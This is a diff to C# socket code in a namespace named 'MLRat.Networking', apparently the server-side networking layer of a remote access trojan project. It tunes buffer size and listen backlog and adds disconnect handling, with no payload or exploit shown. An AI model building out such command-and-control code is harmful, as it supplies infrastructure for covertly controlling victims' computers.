@@ -44,7 +44,7 @@ namespace MLRat.Networking
             #region " Variables and Properties "
 
             private Socket _globalSocket;
-            private int _BufferSize = 1000000;
+            private int _BufferSize = 8192;
             public int BufferSize
             {
                 get
@@ -89,7 +89,7 @@ namespace MLRat.Networking
                 try
                 {
                     _globalSocket.Bind(new IPEndPoint(IPAddress.Any, port));
-                    _globalSocket.Listen(5);
+                    _globalSocket.Listen(100);
                     _globalSocket.BeginAccept(AcceptCallback, null);
                     
                     IsRunning = true;
@@ -174,6 +174,13 @@ namespace MLRat.Networking
                 if (!IsRunning)
                     return;
                 eSockClient _client = (eSockClient)AR.AsyncState;
+                if(_client.NetworkSocket == null || !_client.NetworkSocket.Connected)
+                {
+                    if (OnClientDisconnect != null)
+                        OnClientDisconnect(this, _client, SocketError.Disconnecting);
+                    _client.Dispose();
+                    return;
+                }
                 SocketError SE;
                 int packetLength = _client.NetworkSocket.EndReceive(AR, out SE);
                 if (SE != SocketError.Success)
@@ -250,7 +257,6 @@ namespace MLRat.Networking
                     NetworkSocket = cSock;
                     Buffer = new byte[8192];
                 }
-
                 public eSockClient(Socket cSock, int bufferSize)
                 {
                     Encryption = new eSockEncryptionSettings();
@@ -263,6 +269,18 @@ namespace MLRat.Networking
                     Encryption = new eSockEncryptionSettings(_method);
                     NetworkSocket = cSock;
                     Buffer = new byte[bufferSize];
+                }
+
+                public void Disconnect()
+                {
+                    try
+                    {
+                        NetworkSocket.Close();
+                    }
+                    catch
+                    {
+
+                    }
                 }
 
                 public void Send(params object[] args)
